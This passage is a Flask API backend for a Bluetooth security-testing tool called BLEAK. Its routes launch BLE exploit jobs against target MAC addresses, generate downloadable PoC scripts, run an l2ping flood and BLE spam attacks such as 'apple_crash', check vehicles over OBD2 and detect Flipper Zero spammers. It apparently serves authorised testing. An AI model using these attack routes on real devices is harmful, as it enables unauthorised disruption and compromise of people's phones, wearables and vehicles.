@app.route("/api/ragnar/beacon-tracking", methods=["POST"])
def ragnar_beacon(): return jsonify({"status": "not_implemented"})
@app.route("/api/ragnar/beacon-results", methods=["GET"])
def ragnar_beacon_r(): return jsonify({"results": []})
@app.route("/api/ragnar/blueborne", methods=["POST"])
def ragnar_blueborne():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    fp = STATE.fingerprints.get(mac.upper(), {})
    vulns = []
    if "linux" in fp.get("os", "").lower(): vulns.append({"cve": "CVE-2017-1000251", "risk": "CRITICAL"})
    if "android" in fp.get("os", "").lower(): vulns.append({"cve": "CVE-2017-0785", "risk": "CRITICAL"})
    return jsonify({"mac": mac, "blueborne_vulns": vulns})
@app.route("/api/ragnar/blueborne-result", methods=["GET"])
def ragnar_blueborne_r(): return jsonify({"results": []})
@app.route("/api/ragnar/data-exfiltration", methods=["POST"])
def ragnar_exfil(): return jsonify({"status": "not_implemented"})
@app.route("/api/ragnar/exfil-result", methods=["GET"])
def ragnar_exfil_r(): return jsonify({"results": []})
@app.route("/api/ragnar/movement-tracking", methods=["POST"])
def ragnar_movement(): return jsonify({"status": "not_implemented"})
@app.route("/api/ragnar/movement-result", methods=["GET"])
def ragnar_movement_r(): return jsonify({"results": []})
@app.route("/api/ragnar/status", methods=["GET"])
def ragnar_status(): return jsonify({"status": "idle"})

# ═══ VEHICLE + OBD2 ═════════════════════════════════════════

@app.route("/api/vehicle/connect", methods=["POST"])
def vehicle_connect():
    data = request.get_json(silent=True) or {}
    address = data.get("elm_mac", data.get("address", ""))
    conn_type = data.get("connection_type", "bluetooth")
    if not address:
        return jsonify({"error": "ELM327 MAC/address required"}), 400
    result = elm_connect(address, conn_type)
    return jsonify(result)

@app.route("/api/vehicle/disconnect", methods=["POST"])
def vehicle_disconnect():
    elm_disconnect()
    return jsonify({"status": "disconnected"})

@app.route("/api/vehicle/read-pids", methods=["POST"])
def vehicle_read_pids():
    data = request.get_json(silent=True) or {}
    pids = data.get("pids", ["010C", "010D", "0105", "0111", "012F"])
    results = elm_read_pids(pids)
    return jsonify({"pids": results})

@app.route("/api/vehicle/live/start", methods=["POST"])
def vehicle_live_start():
    data = request.get_json(silent=True) or {}
    pids = data.get("pids", ["010C", "010D", "0105", "0111"])
    interval = float(data.get("interval", 1.0))
    elm_start_live(pids, interval)
    return jsonify({"status": "started", "pids": pids})

@app.route("/api/vehicle/live/stop", methods=["POST"])
def vehicle_live_stop():
    elm_stop_live()
    return jsonify({"status": "stopped"})

@app.route("/api/vehicle/live/data", methods=["GET"])
def vehicle_live_data():
    return jsonify({"data": elm_get_live()})

@app.route("/api/vehicle/dtc", methods=["GET"])
def vehicle_dtc():
    from obd2_elm327 import _elm_connection
    if not _elm_connection or not _elm_connection._connected:
        return jsonify({"error": "Not connected"}), 400
    dtc = _elm_connection.read_dtc()
    return jsonify({"dtc": dtc})

@app.route("/api/vehicle/test/run", methods=["POST"])
def vehicle_test_run():
    data = request.get_json(silent=True) or {}
    make = data.get("vehicle_make", "generic")
    profile = VEHICLE_PROFILES_LATAM.get(make, {})
    if not profile:
        return jsonify({"error": f"Montadora não encontrada: {make}"}), 400
    results = []
    for vuln_id in profile.get("known_vulns", []):
        check = CHECKS_CATALOG.get(vuln_id)
        if check:
            results.append({"test_id": vuln_id, "test_name": check["name"], "status": "flagged",
                            "severity": check["severity"], "description": check["description"],
                            "evidence": [f"Perfil '{profile['name']}' com vulnerabilidade conhecida {vuln_id}"],
                            "recommendations": [f"Avaliar {vuln_id} na interface BLE do veículo"]})
    ev_risks = profile.get("ev_risks", [])
    for i, risk in enumerate(ev_risks):
        results.append({"test_id": f"EV-{i+1:03d}", "test_name": f"EV Risk: {risk[:50]}", "status": "assessment",
                        "severity": "HIGH", "description": risk,
                        "evidence": ["Risco identificado em literatura de segurança veicular"],
                        "recommendations": ["Avaliar via CAN bus com equipamento especializado"]})
    STATE.vehicle_results = {"vehicle_make": make, "profile": profile["name"], "results": results,
                             "ev_vehicle": bool(profile.get("ev_pids")),
                             "summary": {"total": len(results), "critical": sum(1 for r in results if r.get("severity") == "CRITICAL"),
                                         "high": sum(1 for r in results if r.get("severity") == "HIGH")}}
    return jsonify({"status": "completed", "results": STATE.vehicle_results})

@app.route("/api/vehicle/results", methods=["GET"])
def vehicle_results():
    return jsonify({"running": STATE.vehicle_running, "results": STATE.vehicle_results})

@app.route("/api/vehicle/poc/<test_id>", methods=["GET"])
def vehicle_poc(test_id):
    return jsonify({"test_id": test_id, "status": "assessment_only"})

@app.route("/api/vehicle/catalog", methods=["GET"])
def vehicle_catalog():
    return jsonify({"profiles": {k: {"name": v["name"], "risk_level": v.get("risk_level", "MEDIUM"),
                                      "country": v.get("country", ""), "popular_models": v.get("popular_models", []),
                                      "ev": bool(v.get("ev_pids"))} for k, v in VEHICLE_PROFILES_LATAM.items()},
                     "standard_pids": STANDARD_PIDS, "ev_pids": EV_PIDS})

@app.route("/api/vehicle/profile/<make>", methods=["GET"])
def vehicle_profile(make):
    p = VEHICLE_PROFILES_LATAM.get(make.lower())
    return jsonify(p) if p else (jsonify({"error": "Perfil não encontrado"}), 404)

@app.route("/api/vehicle/pids/<make>", methods=["GET"])
def vehicle_pids(make):
    p = VEHICLE_PROFILES_LATAM.get(make.lower(), {})
    pids = p.get("pids", [])
    ev = p.get("ev_pids", [])
    pid_details = []
    for pid in pids:
        info = STANDARD_PIDS.get(pid, {})
        pid_details.append({"pid": pid, "name": info.get("name", pid), "unit": info.get("unit", "")})
    for pid in ev:
        info = EV_PIDS.get(pid, {})
        pid_details.append({"pid": pid, "name": info.get("name", pid), "unit": info.get("unit", ""), "ev": True})
    return jsonify({"make": make, "pids": pid_details})

@app.route("/api/vehicle/scan/pids", methods=["POST"])
def vehicle_scan_pids():
    data = request.get_json(silent=True) or {}
    pids = data.get("pids", ["010C", "010D", "0105"])
    results = elm_read_pids(pids)
    return jsonify({"results": results})


# ═══ TUYA ═══════════════════════════════════════════════════
@app.route("/api/tuya/discover", methods=["POST"])
def tuya_discover():
    tuya_devs = [d for d in STATE.discovered_devices if "tuya" in (d.get("vendor","") + d.get("name","")).lower() or d.get("is_smart_bulb")]
    STATE.tuya_results = tuya_devs
    return jsonify({"devices": tuya_devs, "count": len(tuya_devs)})
@app.route("/api/tuya/discovery-results", methods=["GET"])
def tuya_results(): return jsonify({"devices": STATE.tuya_results})
@app.route("/api/tuya/extract-key", methods=["POST"])
def tuya_extract(): return jsonify({"status": "not_implemented"})
@app.route("/api/tuya/key-result", methods=["GET"])
def tuya_key(): return jsonify({"keys": STATE.tuya_keys})
@app.route("/api/tuya/control", methods=["POST"])
def tuya_control(): return jsonify({"status": "not_implemented"})

# ═══ EXPLOIT ════════════════════════════════════════════════
@app.route("/api/exploit/run", methods=["POST"])
def exploit_run(): return jsonify({"status": "not_implemented"})
@app.route("/api/exploit/results", methods=["GET"])
def exploit_results(): return jsonify({"results": STATE.exploit_results})
@app.route("/api/exploit/poc/<mac>/<exploit_id>", methods=["GET"])
def exploit_poc(mac, exploit_id): return jsonify({"status": "not_available"})

# ═══ POC GENERATOR ══════════════════════════════════════════
@app.route("/api/poc/generate", methods=["POST"])
def poc_generate():
    """Generate PoC for a specific vulnerability finding."""
    data = request.get_json(silent=True) or {}
    check_id = data.get("check_id", "")
    mac = data.get("mac", "")
    # Find the finding
    finding = None
    for v in STATE.vuln_results:
        if v.get("check_id") == check_id and v.get("mac") == mac:
            finding = v; break
    if not finding:
        finding = {"check_id": check_id, "mac": mac, "device_name": data.get("device_name", "Unknown"),
                   "name": CHECKS_CATALOG.get(check_id, {}).get("name", check_id),
                   "description": CHECKS_CATALOG.get(check_id, {}).get("description", ""),
                   "severity": CHECKS_CATALOG.get(check_id, {}).get("severity", "MEDIUM"),
                   "evidence": data.get("evidence", ""), "cve": CHECKS_CATALOG.get(check_id, {}).get("cve")}
    poc = generate_poc(finding)
    return jsonify(poc)

@app.route("/api/poc/generate-all", methods=["POST"])
def poc_generate_all():
    """Generate PoCs for all current vulnerability findings."""
    pocs = generate_all_pocs(STATE.vuln_results)
    return jsonify({"pocs": pocs, "count": len(pocs)})

@app.route("/api/poc/download/<check_id>/<mac>", methods=["GET"])
def poc_download(check_id, mac):
    """Download a PoC script as a Python file."""
    finding = None
    for v in STATE.vuln_results:
        if v.get("check_id") == check_id and v.get("mac") == mac.upper():
            finding = v; break
    if not finding:
        finding = {"check_id": check_id, "mac": mac.upper(), "device_name": "Unknown",
                   "name": CHECKS_CATALOG.get(check_id, {}).get("name", ""), "description": "",
                   "severity": "", "evidence": "", "cve": None}
    poc = generate_poc(finding)
    from flask import Response
    return Response(poc["script"], mimetype="text/x-python",
                    headers={"Content-Disposition": f'attachment; filename="{poc["filename"]}"'})

# ═══ EXPLOIT EXECUTION (async job pattern) ══════════════════
# Jobs store: job_id -> result dict
_exploit_jobs: dict = {}

@app.route("/api/exploit/execute", methods=["POST"])
def exploit_execute():
    """Start exploit in background. Returns job_id immediately.
    Frontend polls /api/exploit/job/<job_id> for result.
    This avoids browser fetch timeout.
    """
    data = request.get_json(silent=True) or {}
    check_id = data.get("check_id", "")
    mac = data.get("mac", "").upper()
    auth_key = data.get("auth_key", "")
    if not mac:
        return jsonify({"error": "MAC address required"}), 400
    if not check_id:
        return jsonify({"error": "check_id required"}), 400

    # Stop discovery before exploit
    if STATE.discovery_running:
        STATE.discovery_running = False
        try:
            subprocess.run(['bluetoothctl', 'scan', 'off'], capture_output=True, timeout=3)
        except Exception:
            pass

    # Create job
    job_id = f"exp_{int(time.time()*1000)}_{check_id}"
    result = {"check_id": check_id, "mac": mac, "status": "running",
              "job_id": job_id, "started": datetime.now().isoformat()}
    _exploit_jobs[job_id] = result

    # Start in background thread
    extra_kw = {}
    if auth_key: extra_kw["auth_key"] = auth_key
    if data.get("spam_type"): extra_kw["spam_type"] = data["spam_type"]
    if data.get("duration"): extra_kw["duration"] = int(data["duration"])
    if data.get("payload"): extra_kw["payload"] = data["payload"]
    if data.get("targets"): extra_kw["targets"] = data["targets"]

    def _run():
        # Reset adapter before exploit
        try:
            from ble_manager import reset_adapter, remove_device_cache
            remove_device_cache(mac)
            reset_adapter()
        except Exception:
            pass
        time.sleep(1)
        run_exploit_async(check_id, mac, result, **extra_kw)
        # Improve empty error messages
        if result.get("status") == "ERROR" and not result.get("evidence"):
            result["evidence"] = "BLE connection failed. Device may be paired to phone, out of range, or adapter busy."
            result["suggestion"] = "1) Disconnect device from phone 2) Move closer 3) sudo hciconfig {} reset".format(HCI_IFACE)
        # Store exploit results for reports
        if result.get("status") in ("VULNERABLE", "EXECUTED", "COMPLETED"):
            STATE.exploit_results = getattr(STATE, 'exploit_results', [])
            ck = CHECKS_CATALOG.get(check_id, {})
            STATE.exploit_results.append({
                "check_id": check_id, "mac": mac,
                "status": result.get("status"),
                "evidence": result.get("evidence", ""),
                "test_name": result.get("test_name", check_id),
                "severity": result.get("severity") or ck.get("severity", "LOW"),
                "category": result.get("category") or ck.get("category", "exploit"),
                "cve": result.get("cve") or ck.get("cve"),
                "timestamp": result.get("completed", ""),
                "target_results": result.get("target_results", []),
            })
    t = threading.Thread(target=_run, daemon=True)
    t.start()

    # Return immediately with job_id
    return jsonify({"job_id": job_id, "status": "running", "check_id": check_id, "mac": mac})

@app.route("/api/exploit/job/<job_id>", methods=["GET"])
def exploit_job_status(job_id):
    """Poll for exploit job result."""
    result = _exploit_jobs.get(job_id)
    if not result:
        return jsonify({"error": "Job not found", "job_id": job_id}), 404
    return jsonify(result)

@app.route("/api/exploit/available", methods=["GET"])
def exploit_available():
    """List available exploit modules."""
    return jsonify({"exploits": list(EXPLOIT_MAP.keys()) + ["WATCH-READ"],
                     "descriptions": {
                         "BLE-001": "Just Works pairing test — connect without authentication",
                         "BLE-002": "Read characteristics without encryption",
                         "BLE-003": "Find writable characteristics without auth",
                         "BLE-005": "Measure excessive GATT service/characteristic exposure",
                         "BLE-006": "Verify service enumeration without prior bonding",
                         "BLE-007": "Capture advertising data leakage (passive)",
                         "BLE-008": "Static MAC address tracking test",
                         "BLE-012": "Check for exposed DFU service",
                         "BLE-013": "Check for exposed debug/diagnostic services",
                         "BLE-015": "Read firmware/software revision characteristics",
                         "BLE-016": "Read serial number characteristic exposure",
                         "BLE-017": "Find notify/indicate characteristics exposed before bonding",
                         "WATCH-READ": "Read smartwatch data (generic + Mi Band auth)",
                     }})

@app.route("/api/exploit/batch", methods=["POST"])
def exploit_batch():
    """Start batch exploits in background. Returns job_id for polling."""
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "").upper()
    checks = data.get("checks", list(EXPLOIT_MAP.keys()))
    if not mac:
        return jsonify({"error": "MAC required"}), 400

    if STATE.discovery_running:
        STATE.discovery_running = False
        try:
            subprocess.run(['bluetoothctl', 'scan', 'off'], capture_output=True, timeout=3)
        except Exception:
            pass

    job_id = f"batch_{int(time.time()*1000)}"
    job = {"job_id": job_id, "mac": mac, "status": "running",
           "checks": checks, "results": [], "total": len(checks),
           "done": 0, "vulnerable": 0, "started": datetime.now().isoformat()}
    _exploit_jobs[job_id] = job

    def _run_batch():
        time.sleep(0.5)
        for check_id in checks:
            r = {"check_id": check_id, "mac": mac, "status": "running"}
            run_exploit_async(check_id, mac, r)
            job["results"].append(dict(r))
            if r.get("status") in ("VULNERABLE", "EXECUTED", "COMPLETED"):
                ck = CHECKS_CATALOG.get(check_id, {})
                STATE.exploit_results = getattr(STATE, 'exploit_results', [])
                STATE.exploit_results.append({
                    "check_id": check_id, "mac": mac,
                    "status": r.get("status"),
                    "evidence": r.get("evidence", ""),
                    "test_name": r.get("test_name", check_id),
                    "severity": r.get("severity") or ck.get("severity", "LOW"),
                    "category": r.get("category") or ck.get("category", "exploit"),
                    "cve": r.get("cve") or ck.get("cve"),
                    "timestamp": r.get("completed", ""),
                })
            job["done"] = len(job["results"])
            job["vulnerable"] = sum(1 for x in job["results"] if x.get("status") == "VULNERABLE")
            time.sleep(0.3)
        job["status"] = "completed"
        job["completed"] = datetime.now().isoformat()

    threading.Thread(target=_run_batch, daemon=True).start()
    return jsonify({"job_id": job_id, "status": "running", "total": len(checks)})

# ═══ EXPLOIT TEMPLATES ══════════════════════════════════════
@app.route("/api/templates/list", methods=["GET"])
def templates_list():
    tools = bt_check_tools()
    ext = check_external_tools()
    tools.update({k: bool(v) for k, v in ext.items()})
    runnable = get_runnable_templates(tools)
    return jsonify({"templates": runnable, "tools": tools, "categories": get_exploit_categories()})

@app.route("/api/templates/<exploit_id>", methods=["GET"])
def templates_get(exploit_id):
    t = get_template(exploit_id)
    return jsonify(t) if t else (jsonify({"error": "Not found"}), 404)

# ═══ CLASSIC BT ═════════════════════════════════════════════
@app.route("/api/classic/scan", methods=["POST"])
def classic_scan():
    data = request.get_json(silent=True) or {}
    timeout = min(int(data.get("timeout", 10)), 20)  # Cap at 20s
    scan_type = data.get("type", "both")

    job_id = f"classic_{int(time.time()*1000)}"
    job = {"job_id": job_id, "status": "running", "devices": [], "started": datetime.now().isoformat()}
    _exploit_jobs[job_id] = job

    def _run_classic():
        try:
            devices = []
            if scan_type in ("classic", "both"):
                job["phase"] = "Classic BT (hcitool inq)..."
                devices.extend(hci_scan_classic(timeout))
            if scan_type in ("ble", "both"):
                job["phase"] = "BLE (hcitool lescan)..."
                devices.extend(hci_scan_ble(timeout))
            job["devices"] = devices
            job["count"] = len(devices)
            job["status"] = "completed"
        except Exception as e:
            job["status"] = "error"
            job["error"] = str(e)
        job["completed"] = datetime.now().isoformat()

    threading.Thread(target=_run_classic, daemon=True).start()
    return jsonify({"job_id": job_id, "status": "running"})

@app.route("/api/classic/sdp/<mac>", methods=["GET"])
def classic_sdp(mac):
    return jsonify(sdp_browse(mac))

@app.route("/api/classic/info/<mac>", methods=["GET"])
def classic_info(mac):
    return jsonify(hci_info(mac))

@app.route("/api/classic/tools", methods=["GET"])
def classic_tools():
    from ble_manager import detect_adapters
    tools = bt_check_tools()
    ext = check_external_tools()
    adapters = detect_adapters()
    return jsonify({"native_tools": tools, "external_tools": ext, "adapters": adapters})

@app.route("/api/adapters", methods=["GET"])
def adapters_list():
    """List all available BT adapters (HCI + ESP32)."""
    from ble_manager import detect_adapters
    return jsonify(detect_adapters())

@app.route("/api/classic/l2ping", methods=["POST"])
def classic_l2ping():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    if not mac: return jsonify({"error": "MAC required"}), 400
    count = int(data.get("count", 10))
    size = int(data.get("size", 44))
    result = l2ping_flood(mac, count=count, size=size)
    return jsonify(result)

# ═══ BLE SNIFFER (bettercap) ════════════════════════════════
@app.route("/api/sniffer/start", methods=["POST"])
def sniffer_start_route():
    data = request.get_json(silent=True) or {}
    iface = data.get("iface") or _refresh_hci()
    result = sniffer_start(iface)
    return jsonify(result)

@app.route("/api/sniffer/stop", methods=["POST"])
def sniffer_stop_route():
    return jsonify(sniffer_stop())

@app.route("/api/sniffer/status", methods=["GET"])
def sniffer_status_route():
    return jsonify(sniffer_status())

@app.route("/api/sniffer/enum", methods=["POST"])
def sniffer_enum_route():
    data = request.get_json(silent=True) or {}
    mac = data.get("mac", "")
    if not mac:
        return jsonify({"error": "MAC required"}), 400
    return jsonify(sniffer_enum_device(mac))

# ═══ BLE SPAM ENGINE ════════════════════════════════════════
@app.route("/api/spam/start", methods=["POST"])
def spam_start():
    from ble_spam_engine import start_spam
    data = request.get_json(silent=True) or {}
    attack = data.get("attack", "all")
    duration = min(int(data.get("duration", 30)), 120)
    broadcast = data.get("broadcast", True)
    targets = data.get("targets", [])
    esp32_required = False
    esp32_preferred = attack in ("apple", "apple_action", "apple_crash", "sourapple")
    use_esp32 = bool(data.get("use_esp32", False) or esp32_preferred)
    result = start_spam(attack, duration, broadcast=broadcast, target_macs=targets,
                        use_esp32=use_esp32)
    if use_esp32 and not result.get("started"):
        result["requires_esp32"] = True
        result["hint"] = result.get("hint") or (
            "ESP32-C3/S3 não confirmou o início do spam. Se aparecer SPAM:PKT nos logs, "
            "a transmissão começou e o problema era leitura serial antiga; reinicie o servidor "
            "para carregar o parser corrigido. Para Apple, a ESP32 é preferida porque a Realtek "
            "não troca MAC de advertising de forma confiável.")
    # Store for reports
    STATE.exploit_results = getattr(STATE, 'exploit_results', [])
    STATE.exploit_results.append({"check_id": "BLE-SPAM", "attack": attack, "duration": duration,
                                   "targets": targets, "timestamp": datetime.now().isoformat(),
                                   "engine": result.get("engine", "esp32" if use_esp32 else "hci"),
                                   "started": bool(result.get("started"))})
    return jsonify(result)

@app.route("/api/spam/stop", methods=["POST"])
def spam_stop():
    from ble_spam_engine import stop_spam
    return jsonify(stop_spam())

@app.route("/api/spam/status", methods=["GET"])
def spam_status():
    from ble_spam_engine import get_spam_status
    return jsonify(get_spam_status())

@app.route("/api/spam/attacks", methods=["GET"])
def spam_attacks():
    from ble_spam_engine import ATTACK_PROFILES
    return jsonify({"attacks": {k: {"name": v["name"], "target_os": v["target_os"],
                     "devices": list(v["payloads"].keys())} for k, v in ATTACK_PROFILES.items()}})

# ═══ REPORTS (with asset selection) ═════════════════════════
def _append_audio_archive_devices(filtered_state):
    """List selected archived audio evidence as report assets."""
    existing = {str(d.get("mac", "")).upper() for d in getattr(filtered_state, "discovered_devices", []) or []}
    for rec in getattr(filtered_state, "audio_evidence_archive", []) or []:
        mac = str(rec.get("mac", "")).upper()
        if not mac or mac in existing:
            continue
        filtered_state.discovered_devices.append({
            "mac": mac,
            "name": rec.get("device_name") or rec.get("type") or "Archived audio evidence",
            "domain": "audio",
            "vendor": rec.get("vendor", ""),
            "rssi": "",
            "source": "audio_evidence_archive",
        })
        existing.add(mac)

@app.route("/api/reports/generate", methods=["POST"])
def reports_generate():
    data = request.get_json(silent=True) or {}
    report_type = data.get("type", "technical")
    selected_macs_provided = "selected_macs" in data
    selected_macs = data.get("selected_macs", None)  # key absent/None = all devices
    if selected_macs is not None:
        selected_macs = [str(m).upper() for m in selected_macs if str(m or "").strip()]
    selected_audio_evidence = set(data.get("selected_audio_evidence") or [])
    include_audio_archive = bool(data.get("include_audio_archive")) or bool(selected_audio_evidence)
    _audio_archive_load()

    # Filter state for selected assets only
    if selected_macs_provided and selected_macs is not None:
        import copy
        selected_set = set(selected_macs)
        filtered_state = copy.copy(STATE)
        filtered_state.discovered_devices = [d for d in STATE.discovered_devices if str(d.get("mac","")).upper() in selected_set]
        filtered_state.vuln_results = [v for v in STATE.vuln_results if str(v.get("mac","")).upper() in selected_set]
        filtered_state.enum_results = [e for e in STATE.enum_results if str(e.get("mac","")).upper() in selected_set]
        if hasattr(STATE, "_wp_jobs"):
            filtered_state._wp_jobs = {jid: job for jid, job in STATE._wp_jobs.items()
                                       if str(job.get("mac","")).upper() in selected_set}
        else:
            filtered_state._wp_jobs = {}
        if hasattr(STATE, "_rec_jobs"):
            filtered_state._rec_jobs = {jid: job for jid, job in STATE._rec_jobs.items()
                                        if str(job.get("mac","")).upper() in selected_set}
        else:
            filtered_state._rec_jobs = {}
        if include_audio_archive:
            filtered_state.audio_evidence_archive = [
                rec for rec in getattr(STATE, "audio_evidence_archive", [])
                if (selected_audio_evidence and rec.get("archive_id") in selected_audio_evidence)
                or str(rec.get("mac", "")).upper() in selected_set
            ]
        else:
            filtered_state.audio_evidence_archive = [
                rec for rec in getattr(STATE, "audio_evidence_archive", [])
                if str(rec.get("mac", "")).upper() in selected_set
            ]
        filtered_state.exploit_results = [
            ex for ex in getattr(STATE, "exploit_results", [])
            if str(ex.get("mac","")).upper() in selected_set or
            any(str(t.get("mac","")).upper() in selected_set for t in ex.get("targets", []) if isinstance(t, dict))
        ]
        filtered_state.attack_results = [
            ex for ex in getattr(STATE, "attack_results", [])
            if str(ex.get("mac","")).upper() in selected_set or
            any(str(t.get("mac","")).upper() in selected_set for t in ex.get("targets", []) if isinstance(t, dict))
        ]
        _append_audio_archive_devices(filtered_state)
    else:
        filtered_state = STATE
        if selected_audio_evidence:
            import copy
            filtered_state = copy.copy(STATE)
            filtered_state.discovered_devices = []
            filtered_state.vuln_results = []
            filtered_state.enum_results = []
            filtered_state._wp_jobs = {}
            filtered_state._rec_jobs = {}
            filtered_state.exploit_results = []
            filtered_state.attack_results = []
            filtered_state.audio_evidence_archive = [
                rec for rec in getattr(STATE, "audio_evidence_archive", [])
                if rec.get("archive_id") in selected_audio_evidence
            ]
            _append_audio_archive_devices(filtered_state)

    try:
        result = generate_report(filtered_state, report_type, "reports", selected_macs=selected_macs)
        STATE.report_files.append(result)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/list", methods=["GET"])
def reports_list():
    files = []
    if os.path.isdir("reports"):
        for f in sorted(os.listdir("reports"), reverse=True):
            path = os.path.join("reports", f)
            files.append({"filename": f, "size": os.path.getsize(path), "modified": os.path.getmtime(path)})
    return jsonify({"reports": files})

@app.route("/api/reports/download/<filename>", methods=["GET"])
def reports_download(filename):
    safe = re.sub(r'[^a-zA-Z0-9_.\-]', '', filename)
    path = os.path.join("reports", safe)
    return send_file(path, as_attachment=True) if os.path.isfile(path) else (jsonify({"error": "Not found"}), 404)

# ═══ CAPTURE ════════════════════════════════════════════════
@app.route("/api/capture/start", methods=["POST"])
def capture_start(): return jsonify({"status": "not_implemented"})
@app.route("/api/capture/stop", methods=["POST"])
def capture_stop(): STATE.capture_active = False; return jsonify({"status": "stopped"})
@app.route("/api/capture/status", methods=["GET"])
def capture_status(): return jsonify({"active": STATE.capture_active})
@app.route("/api/capture/download", methods=["GET"])
def capture_download(): return jsonify({"error": "No capture"}), 404

# ═══ UUID ═══════════════════════════════════════════════════
@app.route("/api/uuid/resolve", methods=["GET"])
def uuid_resolve():
    uuid = request.args.get("uuid", "")
    name = resolve_uuid(uuid)
    return jsonify({"uuid": uuid, "name": name, "known": name != "Unknown"})
@app.route("/api/uuid/catalog", methods=["GET"])
def uuid_catalog(): return jsonify({"catalog": UUID_CATALOG})
@app.route("/api/uuid/company/<cid>", methods=["GET"])
def uuid_company(cid):
    from ble_device_fingerprint import COMPANY_IDS
    try: cid_int = int(cid, 16) if cid.startswith("0x") else int(cid)
    except: return jsonify({"error": "Invalid"}), 400
    return jsonify({"company_id": cid, "name": COMPANY_IDS.get(cid_int, "Unknown")})

# ═══ FINGERPRINT ════════════════════════════════════════════
@app.route("/api/fingerprint/device", methods=["POST"])
def fingerprint_single(): return jsonify(fingerprint_device(request.get_json(silent=True) or {}))
@app.route("/api/fingerprint/batch", methods=["POST"])
def fingerprint_batch():
    data = request.get_json(silent=True) or {}
    devs = data.get("devices", STATE.discovered_devices)
    return jsonify({"results": [fingerprint_device(d) for d in devs]})

# ═══ CATALOG ════════════════════════════════════════════════
@app.route("/api/attacks/catalog", methods=["GET"])
def attacks_catalog(): return jsonify({"attacks": []})
@app.route("/api/attacks/profiles", methods=["GET"])
def attacks_profiles(): return jsonify({"profiles": {}})
@app.route("/api/attacks/gatt-profile/<mac>", methods=["GET"])
def attacks_gatt_profile(mac):
    fp = STATE.fingerprints.get(mac.upper())
    return jsonify(fp or {"error": "Not found"})
@app.route("/api/checks/catalog", methods=["GET"])
def checks_catalog(): return jsonify({"checks": CHECKS_CATALOG, "profiles": VULN_PROFILES})
@app.route("/api/checks/profiles", methods=["GET"])
def checks_profiles(): return jsonify({"profiles": VULN_PROFILES})

# ═══ GATT LOG ═══════════════════════════════════════════════
@app.route("/api/gatt-log/create", methods=["POST"])
def gatt_log_create():
    sid = f"glog_{int(time.time())}"
    STATE.gatt_log_sessions.append({"id": sid, "created": datetime.now().isoformat(), "entries": []})
    return jsonify({"session_id": sid})
@app.route("/api/gatt-log/sessions", methods=["GET"])
def gatt_log_sessions(): return jsonify({"sessions": STATE.gatt_log_sessions})
@app.route("/api/gatt-log/<session_id>", methods=["GET"])
def gatt_log_get(session_id):
    for s in STATE.gatt_log_sessions:
        if s["id"] == session_id: return jsonify(s)
    return jsonify({"error": "Not found"}), 404
@app.route("/api/gatt-log/<session_id>/force-sync", methods=["POST"])
def gatt_log_sync(session_id): return jsonify({"status": "synced"})

# ═══ DEBUG ══════════════════════════════════════════════════
@app.route("/api/debug/state", methods=["GET"])
def debug_state(): return jsonify(STATE.to_dict())
@app.route("/api/debug/esp32/raw", methods=["POST"])
def debug_esp32_raw():
    data = request.get_json(silent=True) or {}
    if esp32_bridge and esp32_bridge.connected: return jsonify(esp32_bridge.send_command(data.get("command", "")))
    return jsonify({"error": "ESP32 not connected"})
@app.route("/api/debug/scan-interfaces", methods=["GET"])
def debug_scan_interfaces():
    iface = _refresh_hci()
    ifaces = {"hci": iface, "hci_available": detect_hci0(), "esp32": ESP32_AVAILABLE, "esp32_port": ESP32_PORT}
    try:
        r = subprocess.run(['hciconfig', '-a'], capture_output=True, text=True, timeout=5)
        ifaces["hciconfig"] = r.stdout
    except: ifaces["hciconfig"] = "N/A"
    return jsonify(ifaces)

# ═══ SYSTEM ═════════════════════════════════════════════════
@app.route("/api/system/capabilities", methods=["GET"])
def system_capabilities():
    caps = {"bleak": False, "esp32": ESP32_AVAILABLE, "nrf52840": False,
            "bettercap": False, "l2ping": False, "hcitool": False,
            "hci": _refresh_hci(), "hci_available": detect_hci0(), "hci0": detect_hci0()}
    try: import bleak; caps["bleak"] = True
    except: pass
    for tool in ["bettercap", "l2ping", "hcitool"]:
        try: subprocess.run(["which", tool], capture_output=True, timeout=3); caps[tool] = True
        except: pass
    return jsonify(caps)

@app.route("/api/ai/analyze", methods=["POST"])
def ai_analyze():
    return jsonify({"analysis": {"total_devices": len(STATE.discovered_devices), "total_vulns": len(STATE.vuln_results),
                                  "critical": sum(1 for v in STATE.vuln_results if v.get("severity") == "CRITICAL")}})

@app.route("/api/version", methods=["GET"])
def api_version(): return jsonify({"version": APP_VERSION, "name": "BLEAK"})

# ═══ EXTERNAL SPAMMER DETECTION (Flipper Zero, M5Cardputer) ═══════
@app.route("/api/spam/external-scan", methods=["POST"])
def spam_external_scan():
    """Scan for external BLE spam sources (Flipper Zero, M5Cardputer, etc.).
    Identifies pentest devices in range by OUI, manufacturer data, and name patterns.
    Returns: MAC, name, RSSI, device type, advertising payload.
    """
    import asyncio
    from bleak import BleakScanner

    data = request.get_json(silent=True) or {}
    duration = min(int(data.get("duration", 10)), 30)

    job_id = "ext_scan_{}".format(int(time.time()))
    if not hasattr(STATE, "_wp_jobs"): STATE._wp_jobs = {}
    job = {"job_id": job_id, "status": "running", "found": [], "duration": duration}
    STATE._wp_jobs[job_id] = job

    def _run():
        async def _scan():
            pentest_ouis = {"80:E1:26", "A4:CF:12", "3C:71:BF", "7C:9E:BD",
                            "24:6F:28", "30:AE:A4", "B8:27:EB", "DC:A6:32"}
            found = []
            def _cb(device, adv):
                mac = str(device.address).upper()
                name = adv.local_name or device.name or ""
                oui = mac[:8]
                nl = name.lower()
                mfr = adv.manufacturer_data or {}

                ptype = None
                if "flipper" in nl or oui == "80:E1:26" or 0x0822 in mfr:
                    ptype = "flipper_zero"
                elif "m5" in nl or "cardputer" in nl or oui in {"A4:CF:12","3C:71:BF"}:
                    ptype = "m5cardputer"
                elif oui in {"B8:27:EB","DC:A6:32"} or "kali" in nl or "hack" in nl:
                    ptype = "raspberry_pi"
                elif any(k in nl for k in ["spam","ble_adv","marauder","bruteforce"]):
                    ptype = "generic_pentest"

                if ptype:
                    rssi = getattr(adv, 'rssi', getattr(device, 'rssi', -99))
                    svc_data = {}
                    if adv.service_data:
                        for k, v in adv.service_data.items():
                            svc_data[str(k)] = v.hex()
                    entry = {
                        "mac": mac, "name": name or "?",
                        "rssi": rssi, "type": ptype,
                        "oui": oui,
                        "mfr_data": {str(k): v.hex() for k, v in mfr.items()},
                        "service_data": svc_data,
                        "label": {
